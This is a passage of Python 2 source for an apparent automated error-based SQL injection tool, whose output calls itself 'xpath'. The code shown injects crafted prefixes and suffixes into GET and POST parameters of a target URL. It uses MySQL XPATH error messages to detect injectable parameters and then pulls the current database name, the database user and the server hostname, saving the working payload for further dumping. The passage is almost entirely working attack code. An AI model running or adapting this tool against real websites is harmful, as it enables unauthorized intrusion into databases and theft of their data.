##                                print br + fw + sn + "["+strftime("%H:%M:%S")+"] [CRITICAL] %s | Resource %s "% (e.code, e.msg)
                                sleep(1)
                                pass
                            except (IOError, httplib.HTTPException) as e:
                                ConnTimeOut()
                                pass
                            except KeyboardInterrupt:
                                KeyBoardInterrupt()
                                break   
                            else:
                                try:
                                    respdata = resp.read()
                                    retVal = respdata.split("XPATH syntax error: '~")[1].split("'")[0]
                                    if 'XPATH syntax error' in respdata:
                                        vul = True
                                        print fg + sb + 'xpath identified the following injection point(s) with a total of %d HTTP(s) requests:' % HTTPReqCount
                                        infos += 'xpath identified the following injection point(s) with a total of %d HTTP(s) requests:\n' % HTTPReqCount
                                        print fw + sn + '---'
                                        infos += '---\n'
                                        print fw + sn + 'Parameter: (GET)'
                                        infos += 'Parameter: (GET)\n'
                                        print fw + sn + '\tType: error-based'
                                        infos += '\tType: error-based\n'
                                        print fw + sn + '\tTitle: %s' % test
                                        infos += '\tTitle: %s\n' % test
                                        print fw + sn + '\tPayload: %s' % tgt
                                        infos += '\tPayload: %s\n' % tgt
                                        # ----------------------------------------
                                        # for later usage of dumiping other things
                                        CreatePayloadFile()
                                        with open(payload,'w') as ft:
                                            ft.write('%s' % tgt)
                                            ft.close()
                                        # ----------------------------------------
                                        print fw + sn + '---'
                                        infos += '---\n'
                                    
                                except IndexError as e:
                                    pass
                                except Exception as e:
                                    #print '[-] %s' % e
                                    pass
                                except KeyboardInterrupt:
                                    KeyBoardInterrupt()
                                    break
                                else:
                                    Query_Test = False
                                    print fw + sn + "["+strftime("%H:%M:%S")+"] [INFO] the back-end DBMS is MySQL"
                                    if wsr and war:
                                        print fw + sn + "["+strftime("%H:%M:%S")+"] [INFO] web server technology: %s, %s" % (war, wsr)
                                        infos += "web server technology: %s, %s\n" % (war, wsr)
                                    else:
                                        print fw + sn + "["+strftime("%H:%M:%S")+"] [INFO] web server technology: %s" % wsr
                                        infos += "web server technology: %s\n" % wsr
                                    infos += "the back-end DBMS is MySQL\n"
                                    print fg + sn + "["+strftime("%H:%M:%S")+"] [INFO] fetching current database"
                                    for QueryIndex in CURRENTDB:
                                        if not Query_Test:
                                            QueryToTest = ('%s' % QueryIndex)
                                            if '0x72306f74' in tgt:
                                                FinalCountQuery_replaced = tgt.replace('0x72306f74', QueryToTest)
                                                try:
                                                    req = Request(url, data=FinalCountQuery_replaced, headers={'User-agent':ua})
                                                    resp = urlopen(req, timeout=10)
                                                except URLError as e:
                                                    URLError()
                                                    sleep(1)
                                                    pass
                                                except HTTPError as e:
##                                                    print br + fw + sn + "["+strftime("%H:%M:%S")+"] [CRITICAL] %s | Resource %s "% (e.code, e.msg)
                                                    sleep(1)
                                                    pass
                                                except (IOError, httplib.HTTPException) as e:
                                                    ConnTimeOut()
                                                    pass
                                                except KeyboardInterrupt:
                                                    KeyBoardInterrupt()
                                                    break
                                                else:
                                                    try:
                                                        respdata = resp.read()
                                                        CurDB = respdata.split("XPATH syntax error: '~")[1].split("'")[0]
                                                        if 'XPATH syntax error' in respdata:
                                                            Query_Test = True
                                                            print fg + sb + "["+strftime("%H:%M:%S")+"] [INFO] retrieved: %s" % CurDB
                                                            infos += "current database: %s\n" % CurDB
                                                            print fg + sb + "current database: '%s'" % CurDB
                                                    except IndexError as e:
                                                        pass
                                                    except Exception as e:
##                                                        print '[-] %s' % e
##                                                        sys.exit(0)
                                                        pass
                                                    except KeyboardInterrupt:
                                                        KeyBoardInterrupt()
                                                        break
                                        if Query_Test:
                                            break            
                        if vul:
                            break
                    except (TypeError, IOError, IndexError):
                        pass
                    except KeyboardInterrupt:
                        KeyBoardInterrupt()
                        break
                    
            f.write(infos)
            f.close()
            print fg + sn + "["+strftime("%H:%M:%S")+"] [INFO] fetched data logged to text files under '%s'" % target
            
        else:
            print fw + sn + "xpath resumed the following injection point(s) from stored session:"
            infos += "\nxpath resumed the following injection point(s) from stored session:\n"
            with open(logs, "r") as prev_session:
                for line in islice(prev_session,1,7):
                    out = line.rstrip()
                    if out:
                        print fw + sn + out
                        infos += out+"\n"
            prev_session.close()
            HTTPResponses(url, data)
            Query_Test = False
            tempfread = tempf.readline()
            print fw + sn + "["+strftime("%H:%M:%S")+"] [INFO] the back-end DBMS is MySQL"
            if wsr and war:
                print fw + sn + "["+strftime("%H:%M:%S")+"] [INFO] web server technology: %s, %s" % (war, wsr)
                infos += "web server technology: %s, %s\n" % (war, wsr)
            else:
                print fw + sn + "["+strftime("%H:%M:%S")+"] [INFO] web server technology: %s" % wsr
                infos += "web server technology: %s\n" % wsr
            infos += "the back-end DBMS is MySQL\n"
            print fg + sn + "["+strftime("%H:%M:%S")+"] [INFO] fetching current database"
            for QueryIndex in CURRENTDB:
                if not Query_Test:
                    QueryToTest = ('%s' % QueryIndex)
                    if '0x72306f74' in tempfread:
                        FinalCountQuery_replaced = tempfread.replace('0x72306f74', QueryToTest)
                        try:
                            req = Request(url, data=FinalCountQuery_replaced, headers={'User-agent':ua})
                            resp = urlopen(req, timeout=10)
                        except URLError as e:
                            URLError()
                            sleep(1)
                            pass
                        except HTTPError as e:
##                            print br + fw + sn + "["+strftime("%H:%M:%S")+"] [CRITICAL] %s | Resource %s "% (e.code, e.msg)
                            sleep(1)
                            pass
                        except (IOError, httplib.HTTPException) as e:
                            ConnTimeOut()
                            pass
                        except KeyboardInterrupt:
                            KeyBoardInterrupt()
                            break
                        else:
                            try:
                                respdata = resp.read()
                                CurDB = respdata.split("XPATH syntax error: '~")[1].split("'")[0]
                                if 'XPATH syntax error' in respdata:
                                    Query_Test = True
                                    print fg + sb + "["+strftime("%H:%M:%S")+"] [INFO] retrieved: %s" % CurDB
                                    infos += "current database:  %s\n" % CurDB
                                    print fg + sb + "current database:  '%s'" % CurDB
                                    
                            except IndexError as e:
                                pass
                            except Exception as e:
##                                print '[-] %s' % e
##                                sys.exit(0)
                                pass
                            except KeyboardInterrupt:
                                KeyBoardInterrupt()
                                break
                if Query_Test:
                    break
            tempf.close()
            f.write(infos)
            f.close()
            print fg + sn + "["+strftime("%H:%M:%S")+"] [INFO] fetched data logged to text files under '%s'" % target
            infos = ""
        
    else:
        pass


def current_user(url, data):
    global war,wsr
    global logs,payload
    HTTPReqCount = 0
    infos = ""
#------------------------------------------
    f = open(logs,'a')              
#------------------------------------------
## ------------------------------------------------------------------------------------------------
##                              GET DATA INJECTION
## ------------------------------------------------------------------------------------------------
    if url != None and data == None:
        try:
            ## have to generate each file with website name to save payload
            tempf = open(payload,'r')
        except (Exception, IOError) as e:
            if 'No such file or directory' in e:
                vul = False
                for prefix, query, sufix, inline_comment in product(PREFIXES, TESTS, SUFIXES, (False, True)):
                    try:
                        if not vul:
                            temp = ("%s%s%s" % (prefix, query, sufix)).replace(" " if inline_comment else "/**/","/**/")
                            if '*' in url:
                                first, last = url.split('*')
                                tgt = first + temp + last
                                #print fc + sn + "["+strftime("%H:%M:%S")+"] [INFO] testing injection on user define parameter: (GET)" 
                            else:
                                tgt = url + temp

                            try:
                                print fg + sn + "["+strftime("%H:%M:%S")+"] [INFO] testing '" + fg + sn + test + fg + sn + "'"
                                req = Request(tgt, headers={'User-agent':ua})
                                HTTPReqCount += 1
                                resp = urlopen(req, timeout=10)
                            except URLError as e:
                                URLError()
                                sleep(1)
                                pass
                            except HTTPError as e:
##                                print br + fw + sn + "["+strftime("%H:%M:%S")+"] [CRITICAL] %s | Resource %s "% (e.code, e.msg)
                                sleep(1)
                                pass
                            except (IOError, httplib.HTTPException) as e:
                                ConnTimeOut()
                                pass
                            except KeyboardInterrupt:
                                KeyBoardInterrupt()
                                break
                            else:
                                try:
                                    respdata = resp.read()
                                    retVal = respdata.split("XPATH syntax error: '~")[1].split("'")[0]
                                    if 'XPATH syntax error' in respdata:
                                        vul = True
                                        print fg + sb + 'xpath identified the following injection point(s) with a total of %d HTTP(s) requests:' % HTTPReqCount
                                        infos += 'xpath identified the following injection point(s) with a total of %d HTTP(s) requests:\n' % HTTPReqCount
                                        print fw + sn + '---'
                                        infos += '---\n'
                                        print fw + sn + 'Parameter: (GET)'
                                        infos += 'Parameter: (GET)\n'
                                        print fw + sn + '\tType: error-based'
                                        infos += '\tType: error-based\n'
                                        print fw + sn + '\tTitle: %s' % test
                                        infos += '\tTitle: %s\n' % test
                                        print fw + sn + '\tPayload: %s' % tgt
                                        infos += '\tPayload: %s\n' % tgt
                                        # ----------------------------------------
                                        # for later usage of dumiping other things
                                        CreatePayloadFile()
                                        with open(payload,'w') as ft:
                                            ft.write('%s' % tgt)
                                            ft.close()
                                        # ----------------------------------------
                                        print fw + sn + '---'
                                        infos += '---\n'
                                except IndexError as e:
                                    pass
                                except Exception as e:
                                    print '[-] %s' % e
                                except KeyboardInterrupt:
                                    KeyBoardInterrupt()
                                    break
                                else:
                                    Query_Test = False
                                    print fw + sn + "["+strftime("%H:%M:%S")+"] [INFO] the back-end DBMS is MySQL"
                                    if wsr and war:
                                        print fg + sn + "["+strftime("%H:%M:%S")+"] [INFO] web server technology: %s, %s" % (war, wsr)
                                        infos += "web server technology: %s, %s\n" % (war, wsr)
                                    else:
                                        print fg + sn + "["+strftime("%H:%M:%S")+"] [INFO] web server technology: %s" % wsr
                                        infos += "web server technology: %s\n" % wsr
                                    infos += "the back-end DBMS is MySQL\n"
                                    print fg + sn + "["+strftime("%H:%M:%S")+"] [INFO] fetching current user"
                                    tmp = ""
                                    for QueryIndex in CURRENTUSER:
                                        if not Query_Test:
                                            QueryToTest = ('%s' % QueryIndex)
                                            if '0x72306f74' in tgt:
                                                FinalCountQuery_replaced = tgt.replace('0x72306f74', QueryToTest)
                                                try:
                                                    req = Request(FinalCountQuery_replaced, headers={'User-agent':ua})
                                                    resp = urlopen(req, timeout=10)
                                                except URLError as e:
                                                    URLError()
                                                    sleep(1)
                                                    pass
                                                except HTTPError as e:
##                                                    print br + fw + sn + "["+strftime("%H:%M:%S")+"] [CRITICAL] %s | Resource %s "% (e.code, e.msg)
                                                    sleep(1)
                                                    pass
                                                except (IOError, httplib.HTTPException) as e:
                                                    ConnTimeOut()
                                                    pass
                                                except KeyboardInterrupt:
                                                    KeyBoardInterrupt()
                                                    break
                                                else:
                                                    try:
                                                        respdata = resp.read()
                                                        CurUser = respdata.split("XPATH syntax error: '~")[1].split("'")[0]
                                                        if 'XPATH syntax error' in respdata:
                                                            Query_Test = True
                                                            print fg + sb + "["+strftime("%H:%M:%S")+"] [INFO] retrieved: %s" % CurUser
                                                            infos += "current user: %s\n" % CurUser
                                                            print fg + sb + "current user: '%s'" % CurUser
                                                    except IndexError as e:
                                                        pass
                                                    except Exception as e:
                                                        #print '[-] %s' % e
                                                        pass
                                                    except KeyboardInterrupt:
                                                        KeyBoardInterrupt()
                                                        break
                                                    
                                        if Query_Test:
                                            break            
                        if vul:
                            break
                    except (TypeError, IOError, IndexError):
                        pass
                    except KeyboardInterrupt:
                        KeyBoardInterrupt()
                        break      
            f.write(infos) 
            f.close()
            print fg + sn + "["+strftime("%H:%M:%S")+"] [INFO] fetched data logged to text files under '%s'" % target
            
        else:   
            print fw + sn + "xpath resumed the following injection point(s) from stored session:"
            infos += "\nxpath resumed the following injection point(s) from stored session:\n"
            with open(logs, "r") as prev_session:
                for line in islice(prev_session,1,7):
                    out = line.rstrip()
                    if out:
                        print fw + sn + out
                        infos += out+"\n"
            prev_session.close()
            Query_Test = False
            tempfread = tempf.readline()
            url = None
            print fw + sn + "["+strftime("%H:%M:%S")+"] [INFO] the back-end DBMS is MySQL"
            if wsr and war:
                print fw + sn + "["+strftime("%H:%M:%S")+"] [INFO] web server technology: %s, %s" % (war, wsr)
                infos += "web server technology: %s, %s\n" % (war, wsr)
            else:
                print fw + sn + "["+strftime("%H:%M:%S")+"] [INFO] web server technology: %s" % wsr
                infos += "web server technology: %s\n" % wsr
            infos += "the back-end DBMS is MySQL\n"
            print fg + sn + "["+strftime("%H:%M:%S")+"] [INFO] fetching current user"
            for QueryIndex in CURRENTUSER:
                if not Query_Test:
                    QueryToTest = ('%s' % QueryIndex)
                    if '0x72306f74' in tempfread:
                        FinalCountQuery_replaced = tempfread.replace('0x72306f74', QueryToTest)
                        try:
                            req = Request(FinalCountQuery_replaced, headers={'User-agent':ua})
                            resp = urlopen(req, timeout=10)
                        except URLError as e:
                            URLError()
                            sleep(1)
                            pass
                        except HTTPError as e:
##                            print br + fw + sn + "["+strftime("%H:%M:%S")+"] [CRITICAL] %s | Resource %s "% (e.code, e.msg)
                            sleep(1)
                            pass
                        except (IOError, httplib.HTTPException) as e:
                            ConnTimeOut()
                            pass
                        except KeyboardInterrupt:
                            KeyBoardInterrupt()
                            break
                        else:
                            try:
                                respdata = resp.read()
                                CurUser = respdata.split("XPATH syntax error: '~")[1].split("'")[0]
                                if 'XPATH syntax error' in respdata:
                                    Query_Test = True
                                    print fg + sb + "["+strftime("%H:%M:%S")+"] [INFO] retrieved: %s" % CurUser
                                    infos += "current user: %s\n" % CurUser
                                    print fg + sb + "current user: '%s'" % CurUser
                            except IndexError as e:
                                pass
                            except Exception as e:
                                #print '[-] %s' % e
                                pass
                            except KeyboardInterrupt:
                                KeyBoardInterrupt()
                                break
                            
                if Query_Test:
                    break
            tempf.close()
            f.write(infos)
            f.close()
            print fg + sn + "["+strftime("%H:%M:%S")+"] [INFO] fetched data logged to text files under '%s'" % target
            infos = ""
## ------------------------------------------------------------------------------------------------
##                              POST DATA INJECTION
## ------------------------------------------------------------------------------------------------
    elif url != None and data != None:
        try:
            ## have to generate each file with website name to save payload
            tempf = open(payload,'r')
        except (Exception, IOError) as e:
            if 'No such file or directory' in e:
                vul = False
                for prefix, query, sufix, inline_comment in product(PREFIXES, TESTS, SUFIXES, (False, True)):
                    try:
                        if not vul:
                            temp = ("%s%s%s" % (prefix, query, sufix)).replace(" " if inline_comment else "/**/","/**/")
                            if '*' in data:
                                first, last = data.split('*')
                                tgt = first + temp + last
                                #print fc + sn + "["+strftime("%H:%M:%S")+"] [INFO] testing injection on user define parameter: (POST)" 
                            else:
                                tgt = data + temp

                            try:
                                print fg + sn + "["+strftime("%H:%M:%S")+"] [INFO] testing '"+ fg + sn + test + fg + sn + "'"
                                req = Request(url, data=tgt, headers={'User-agent':ua})
                                HTTPReqCount += 1
                                resp = urlopen(req, timeout=10)
                            except URLError as e:
                                URLError()
                                sleep(1)
                                pass
                            except HTTPError as e:
##                                print br + fw + sn + "["+strftime("%H:%M:%S")+"] [CRITICAL] %s | Resource %s "% (e.code, e.msg)
                                sleep(1)
                                pass
                            except (IOError, httplib.HTTPException) as e:
                                ConnTimeOut()
                                pass
                            except KeyboardInterrupt:
                                KeyBoardInterrupt()
                                break   
                            else:
                                try:
                                    respdata = resp.read()
                                    retVal = respdata.split("XPATH syntax error: '~")[1].split("'")[0]
                                    if 'XPATH syntax error' in respdata:
                                        vul = True
                                        print fg + sb + 'xpath identified the following injection point(s) with a total of %d HTTP(s) requests:' % HTTPReqCount
                                        infos += 'xpath identified the following injection point(s) with a total of %d HTTP(s) requests:\n' % HTTPReqCount
                                        print fw + sn + '---'
                                        infos += '---\n'
                                        print fw + sn + 'Parameter: (GET)'
                                        infos += 'Parameter: (GET)\n'
                                        print fw + sn + '\tType: error-based'
                                        infos += '\tType: error-based\n'
                                        print fw + sn + '\tTitle: %s' % test
                                        infos += '\tTitle: %s\n' % test
                                        print fw + sn + '\tPayload: %s' % tgt
                                        infos += '\tPayload: %s\n' % tgt
                                        # ----------------------------------------
                                        # for later usage of dumiping other things
                                        CreatePayloadFile()
                                        with open(payload,'w') as ft:
                                            ft.write('%s' % tgt)
                                            ft.close()
                                        # ----------------------------------------
                                        print fw + sn + '---'
                                        infos += '---\n'
                                    
                                except IndexError as e:
                                    pass
                                except Exception as e:
                                    #print '[-] %s' % e
                                    pass
                                except KeyboardInterrupt:
                                    KeyBoardInterrupt()
                                    break
                                else:
                                    Query_Test = False
                                    print fw + sn + "["+strftime("%H:%M:%S")+"] [INFO] the back-end DBMS is MySQL"
                                    if wsr and war:
                                        print fw + sn + "["+strftime("%H:%M:%S")+"] [INFO] web server technology: %s, %s" % (war, wsr)
                                        infos += "web server technology: %s, %s\n" % (war, wsr)
                                    else:
                                        print fw + sn + "["+strftime("%H:%M:%S")+"] [INFO] web server technology: %s" % wsr
                                        infos += "web server technology: %s\n" % wsr
                                    infos += "the back-end DBMS is MySQL\n"
                                    print fg + sn + "["+strftime("%H:%M:%S")+"] [INFO] fetching current user"
                                    for QueryIndex in CURRENTUSER:
                                        if not Query_Test:
                                            QueryToTest = ('%s' % QueryIndex)
                                            if '0x72306f74' in tgt:
                                                FinalCountQuery_replaced = tgt.replace('0x72306f74', QueryToTest)
                                                try:
                                                    req = Request(url, data=FinalCountQuery_replaced, headers={'User-agent':ua})
                                                    resp = urlopen(req, timeout=10)
                                                except URLError as e:
                                                    URLError()
                                                    sleep(1)
                                                    pass
                                                except HTTPError as e:
##                                                    print br + fw + sn + "["+strftime("%H:%M:%S")+"] [CRITICAL] %s | Resource %s "% (e.code, e.msg)
                                                    sleep(1)
                                                    pass
                                                except (IOError, httplib.HTTPException) as e:
                                                    ConnTimeOut()
                                                    pass
                                                except KeyboardInterrupt:
                                                    KeyBoardInterrupt()
                                                    break
                                                else:
                                                    try:
                                                        respdata = resp.read()
                                                        CurUser = respdata.split("XPATH syntax error: '~")[1].split("'")[0]
                                                        if 'XPATH syntax error' in respdata:
                                                            Query_Test = True
                                                            print fg + sb + "["+strftime("%H:%M:%S")+"] [INFO] retrieved: %s" % CurUser
                                                            infos += "current user: %s\n" % CurUser
                                                            print fg + sb + "current user: '%s'" % CurUser
                                                    except IndexError as e:
                                                        pass
                                                    except Exception as e:
##                                                        print '[-] %s' % e
##                                                        sys.exit(0)
                                                        pass
                                                    except KeyboardInterrupt:
                                                        KeyBoardInterrupt()
                                                        break
                                        if Query_Test:
                                            break            
                        if vul:
                            break
                    except (TypeError, IOError, IndexError):
                        pass
                    except KeyboardInterrupt:
                        KeyBoardInterrupt()
                        break
                    
            f.write(infos)
            f.close()
            print fg + sn + "["+strftime("%H:%M:%S")+"] [INFO] fetched data logged to text files under '%s'" % target
            
        else:
            print fw + sn + "xpath resumed the following injection point(s) from stored session:"
            infos += "\nxpath resumed the following injection point(s) from stored session:\n"
            with open(logs, "r") as prev_session:
                for line in islice(prev_session,1,7):
                    out = line.rstrip()
                    if out:
                        print fw + sn + out
                        infos += out+"\n"
            prev_session.close()
            HTTPResponses(url, data)
            Query_Test = False
            tempfread = tempf.readline()
            print fw + sn + "["+strftime("%H:%M:%S")+"] [INFO] the back-end DBMS is MySQL"
            if wsr and war:
                print fw + sn + "["+strftime("%H:%M:%S")+"] [INFO] web server technology: %s, %s" % (war, wsr)
                infos += "web server technology: %s, %s\n" % (war, wsr)
            else:
                print fw + sn + "["+strftime("%H:%M:%S")+"] [INFO] web server technology: %s" % wsr
                infos += "web server technology: %s\n" % wsr
            infos += "the back-end DBMS is MySQL\n"
            print fg + sn + "["+strftime("%H:%M:%S")+"] [INFO] fetching current user"
            for QueryIndex in CURRENTUSER:
                if not Query_Test:
                    QueryToTest = ('%s' % QueryIndex)
                    if '0x72306f74' in tempfread:
                        FinalCountQuery_replaced = tempfread.replace('0x72306f74', QueryToTest)
                        try:
                            req = Request(url, data=FinalCountQuery_replaced, headers={'User-agent':ua})
                            resp = urlopen(req, timeout=10)
                        except URLError as e:
                            URLError()
                            sleep(1)
                            pass
                        except HTTPError as e:
##                            print br + fw + sn + "["+strftime("%H:%M:%S")+"] [CRITICAL] %s | Resource %s "% (e.code, e.msg)
                            sleep(1)
                            pass
                        except (IOError, httplib.HTTPException) as e:
                            ConnTimeOut()
                            pass
                        except KeyboardInterrupt:
                            KeyBoardInterrupt()
                            break
                        else:
                            try:
                                respdata = resp.read()
                                CurUser = respdata.split("XPATH syntax error: '~")[1].split("'")[0]
                                if 'XPATH syntax error' in respdata:
                                    Query_Test = True
                                    print fg + sb + "["+strftime("%H:%M:%S")+"] [INFO] retrieved: %s" % CurUser
                                    infos += "current user:  %s\n" % CurUser
                                    print fg + sb + "current user:  '%s'" % CurUser
                                    
                            except IndexError as e:
                                pass
                            except Exception as e:
##                                print '[-] %s' % e
##                                sys.exit(0)
                                pass
                            except KeyboardInterrupt:
                                KeyBoardInterrupt()
                                break
                if Query_Test:
                    break
            tempf.close()
            f.write(infos)
            f.close()
            print fg + sn + "["+strftime("%H:%M:%S")+"] [INFO] fetched data logged to text files under '%s'" % target
            infos = ""
        
    else:
        pass

def hostname(url, data):
    global war,wsr
    global logs,payload
    HTTPReqCount = 0
    infos = ""
#------------------------------------------
    f = open(logs,'a')              
#------------------------------------------
## ------------------------------------------------------------------------------------------------
##                              GET DATA INJECTION
## ------------------------------------------------------------------------------------------------
    if url != None and data == None:
        try:
            ## have to generate each file with website name to save payload
            tempf = open(payload,'r')
        except (Exception, IOError) as e:
            if 'No such file or directory' in e:
                vul = False
                for prefix, query, sufix, inline_comment in product(PREFIXES, TESTS, SUFIXES, (False, True)):
                    try:
                        if not vul:
                            temp = ("%s%s%s" % (prefix, query, sufix)).replace(" " if inline_comment else "/**/","/**/")
                            if '*' in url:
                                first, last = url.split('*')
                                tgt = first + temp + last
                                #print fc + sn + "["+strftime("%H:%M:%S")+"] [INFO] testing injection on user define parameter: (GET)" 
                            else:
                                tgt = url + temp

                            try:
                                print fg + sn + "["+strftime("%H:%M:%S")+"] [INFO] testing '" + fg + sn + test + fg + sn + "'"
                                req = Request(tgt, headers={'User-agent':ua})
                                HTTPReqCount += 1
                                resp = urlopen(req, timeout=10)
                            except URLError as e:
                                URLError()
                                sleep(1)
                                pass
                            except HTTPError as e:
##                                print br + fw + sn + "["+strftime("%H:%M:%S")+"] [CRITICAL] %s | Resource %s "% (e.code, e.msg)
                                sleep(1)
                                pass
                            except (IOError, httplib.HTTPException) as e:
                                ConnTimeOut()
                                pass
                            except KeyboardInterrupt:
                                KeyBoardInterrupt()
                                break
                            else:
                                try:
                                    respdata = resp.read()
                                    retVal = respdata.split("XPATH syntax error: '~")[1].split("'")[0]
                                    if 'XPATH syntax error' in respdata:
                                        vul = True
                                        print fg + sb + 'xpath identified the following injection point(s) with a total of %d HTTP(s) requests:' % HTTPReqCount
                                        infos += 'xpath identified the following injection point(s) with a total of %d HTTP(s) requests:\n' % HTTPReqCount
                                        print fw + sn + '---'
                                        infos += '---\n'
                                        print fw + sn + 'Parameter: (GET)'
                                        infos += 'Parameter: (GET)\n'
                                        print fw + sn + '\tType: error-based'
                                        infos += '\tType: error-based\n'
                                        print fw + sn + '\tTitle: %s' % test
                                        infos += '\tTitle: %s\n' % test
                                        print fw + sn + '\tPayload: %s' % tgt
                                        infos += '\tPayload: %s\n' % tgt
                                        # ----------------------------------------
                                        # for later usage of dumiping other things
                                        CreatePayloadFile()
                                        with open(payload,'w') as ft:
                                            ft.write('%s' % tgt)
                                            ft.close()
                                        # ----------------------------------------
                                        print fw + sn + '---'
                                        infos += '---\n'
                                except IndexError as e:
                                    pass
                                except Exception as e:
##                                    print '[-] %s' % e
                                    pass
                                except KeyboardInterrupt:
                                    KeyBoardInterrupt()
                                    break
                                else:
                                    Query_Test = False
                                    print fw + sn + "["+strftime("%H:%M:%S")+"] [INFO] the back-end DBMS is MySQL"
                                    if wsr and war:
                                        print fg + sn + "["+strftime("%H:%M:%S")+"] [INFO] web server technology: %s, %s" % (war, wsr)
                                        infos += "web server technology: %s, %s\n" % (war, wsr)
                                    else:
                                        print fg + sn + "["+strftime("%H:%M:%S")+"] [INFO] web server technology: %s" % wsr
                                        infos += "web server technology: %s\n" % wsr
                                    infos += "the back-end DBMS is MySQL\n"
                                    print fg + sn + "["+strftime("%H:%M:%S")+"] [INFO] fetching server hostname"
                                    for QueryIndex in HOSTNAMES:
                                        if not Query_Test:
                                            QueryToTest = ('%s' % QueryIndex)
                                            if '0x72306f74' in tgt:
                                                FinalCountQuery_replaced = tgt.replace('0x72306f74', QueryToTest)
                                                try:
                                                    req = Request(FinalCountQuery_replaced, headers={'User-agent':ua})
                                                    resp = urlopen(req, timeout=10)
                                                except URLError as e:
                                                    URLError()
                                                    sleep(1)
                                                    pass
                                                except HTTPError as e:
##                                                    print br + fw + sn + "["+strftime("%H:%M:%S")+"] [CRITICAL] %s | Resource %s "% (e.code, e.msg)
                                                    sleep(1)
                                                    pass
                                                except (IOError, httplib.HTTPException) as e:
                                                    ConnTimeOut()
                                                    pass
                                                except KeyboardInterrupt:
                                                    KeyBoardInterrupt()
                                                    break
                                                else:
                                                    try:
                                                        respdata = resp.read()
                                                        host = respdata.split("XPATH syntax error: '~")[1].split("'")[0]
                                                        if 'XPATH syntax error' in respdata:
                                                            Query_Test = True
                                                            print fg + sb + "["+strftime("%H:%M:%S")+"] [INFO] retrieved: %s" % host
                                                            infos += "hostname: %s\n" % host
                                                            print fg + sb + "hostname: '%s'" % host
                                                    except IndexError as e:
                                                        pass
                                                    except Exception as e:
                                                        #print '[-] %s' % e
                                                        pass
                                                    except KeyboardInterrupt:
                                                        KeyBoardInterrupt()
                                                        break
                                                    
                                        if Query_Test:
                                            break            
                        if vul:
                            break
                    except (TypeError, IOError, IndexError):
                        pass
                    except KeyboardInterrupt:
                        KeyBoardInterrupt()
                        break      
            f.write(infos) 
            f.close()
            print fg + sn + "["+strftime("%H:%M:%S")+"] [INFO] fetched data logged to text files under '%s'" % target
            
        else:   
            print fw + sn + "xpath resumed the following injection point(s) from stored session:"
            infos += "\nxpath resumed the following injection point(s) from stored session:\n"
            with open(logs, "r") as prev_session:
                for line in islice(prev_session,1,7):
                    out = line.rstrip()
                    if out:
                        print fw + sn + out
                        infos += out+"\n"
            prev_session.close()
            Query_Test = False
            tempfread = tempf.readline()
            url = None
            print fw + sn + "["+strftime("%H:%M:%S")+"] [INFO] the back-end DBMS is MySQL"
            if wsr and war:
                print fw + sn + "["+strftime("%H:%M:%S")+"] [INFO] web server technology: %s, %s" % (war, wsr)
                infos += "web server technology: %s, %s\n" % (war, wsr)
            else:
                print fw + sn + "["+strftime("%H:%M:%S")+"] [INFO] web server technology: %s" % wsr
                infos += "web server technology: %s\n" % wsr
            infos += "the back-end DBMS is MySQL\n"
            print fg + sn + "["+strftime("%H:%M:%S")+"] [INFO] fetching server hostname"
            for QueryIndex in HOSTNAMES:
                if not Query_Test:
                    QueryToTest = ('%s' % QueryIndex)
                    if '0x72306f74' in tempfread:
                        FinalCountQuery_replaced = tempfread.replace('0x72306f74', QueryToTest)
                        try:
                            req = Request(FinalCountQuery_replaced, headers={'User-agent':ua})
                            resp = urlopen(req, timeout=10)
                        except URLError as e:
                            URLError()
                            sleep(1)
                            pass
                        except HTTPError as e:
##                            print br + fw + sn + "["+strftime("%H:%M:%S")+"] [CRITICAL] %s | Resource %s "% (e.code, e.msg)
                            sleep(1)
                            pass
                        except (IOError, httplib.HTTPException) as e:
                            ConnTimeOut()
                            pass
                        except KeyboardInterrupt:
                            KeyBoardInterrupt()
                            break
                        else:
                            try:
                                respdata = resp.read()
                                host = respdata.split("XPATH syntax error: '~")[1].split("'")[0]
                                if 'XPATH syntax error' in respdata:
                                    Query_Test = True
                                    print fg + sb + "["+strftime("%H:%M:%S")+"] [INFO] retrieved: %s" % host
                                    infos += "hostname: %s\n" % host
                                    print fg + sb + "hostname: '%s'" % host
                            except IndexError as e:
                                pass
                            except Exception as e:
                                #print '[-] %s' % e
                                pass
                            except KeyboardInterrupt:
                                KeyBoardInterrupt()
                                break
                            
                if Query_Test:
                    break
            tempf.close()
            f.write(infos)
            f.close()
            print fg + sn + "["+strftime("%H:%M:%S")+"] [INFO] fetched data logged to text files under '%s'" % target
            infos = ""
## ------------------------------------------------------------------------------------------------
##                              POST DATA INJECTION
## ------------------------------------------------------------------------------------------------
    elif url != None and data != None:
        try:
            ## have to generate each file with website name to save payload
            tempf = open(payload,'r')
        except (Exception, IOError) as e:
            if 'No such file or directory' in e:
                vul = False
                for prefix, query, sufix, inline_comment in product(PREFIXES, TESTS, SUFIXES, (False, True)):
                    try:
                        if not vul:
                            temp = ("%s%s%s" % (prefix, query, sufix)).replace(" " if inline_comment else "/**/","/**/")
                            if '*' in data:
                                first, last = data.split('*')
                                tgt = first + temp + last
                                #print fc + sn + "["+strftime("%H:%M:%S")+"] [INFO] testing injection on user define parameter: (POST)" 
                            else:
                                tgt = data + temp

                            try:
                                print fg + sn + "["+strftime("%H:%M:%S")+"] [INFO] testing '"+ fg + sn + test + fg + sn + "'"
                                req = Request(url, data=tgt, headers={'User-agent':ua})
                                HTTPReqCount += 1
                                resp = urlopen(req, timeout=10)
                            except URLError as e:
                                URLError()
                                sleep(1)
                                pass
                            except HTTPError as e:
##                                print br + fw + sn + "["+strftime("%H:%M:%S")+"] [CRITICAL] %s | Resource %s "% (e.code, e.msg)
                                sleep(1)
                                pass
                            except (IOError, httplib.HTTPException) as e:
                                ConnTimeOut()
                                pass
                            except KeyboardInterrupt:
                                KeyBoardInterrupt()
                                break   
                            else:
                                try:
                                    respdata = resp.read()
                                    retVal = respdata.split("XPATH syntax error: '~")[1].split("'")[0]
                                    if 'XPATH syntax error' in respdata:
                                        vul = True
                                        print fg + sb + 'xpath identified the following injection point(s) with a total of %d HTTP(s) requests:' % HTTPReqCount
                                        infos += 'xpath identified the following injection point(s) with a total of %d HTTP(s) requests:\n' % HTTPReqCount
                                        print fw + sn + '---'
                                        infos += '---\n'
                                        print fw + sn + 'Parameter: (GET)'
                                        infos += 'Parameter: (GET)\n'
                                        print fw + sn + '\tType: error-based'
                                        infos += '\tType: error-based\n'
                                        print fw + sn + '\tTitle: %s' % test
                                        infos += '\tTitle: %s\n' % test
                                        print fw + sn + '\tPayload: %s' % tgt
                                        infos += '\tPayload: %s\n' % tgt
